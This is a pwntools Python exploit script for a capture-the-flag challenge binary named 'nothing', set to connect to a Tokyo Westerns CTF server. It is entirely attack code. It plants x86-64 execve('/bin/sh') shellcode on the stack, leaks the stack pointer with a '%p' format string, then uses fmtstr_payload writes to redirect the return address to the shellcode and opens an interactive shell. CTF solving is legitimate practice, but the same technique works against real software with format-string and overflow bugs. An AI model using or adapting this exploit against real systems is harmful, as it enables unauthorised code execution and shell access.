from pwn import *
import struct

elf = context.binary = ELF('./nothing')
host = 'pwn02.chal.ctf.westerns.tokyo'
port = 18247

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        #return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        return gdb.debug([elf.path] + argv, env={"disable-randomization": "on"}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()


shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = 'A' * 208 + shellcode
p.recvuntil('> ')
p.sendline(payload)

payload = '%p'
p.recvuntil('> ')
p.sendline(payload)
RSP = int(p.recvline().strip(), 16)
log.info('RSP: {}'.format(hex(RSP)))

shellcode_addr = RSP + 208
log.info('Shellcode addr: {}'.format(hex(shellcode_addr)))
shellcode_addr1 = shellcode_addr & 0xffffffff
shellcode_addr2 = shellcode_addr >> 32

# 4 bytes at a time
writes1 = {RSP + 256 + 8: shellcode_addr1}
payload1 = fmtstr_payload(6, writes1, numbwritten=0)
writes2 = {RSP + 256 + 12: shellcode_addr2}
payload2 = fmtstr_payload(6, writes2, numbwritten=0)

payloads = [payload1, payload2, 'q']
for payload in payloads:
	p.recvuntil('> ')
	p.sendline(payload)


p.interactive()
p.close()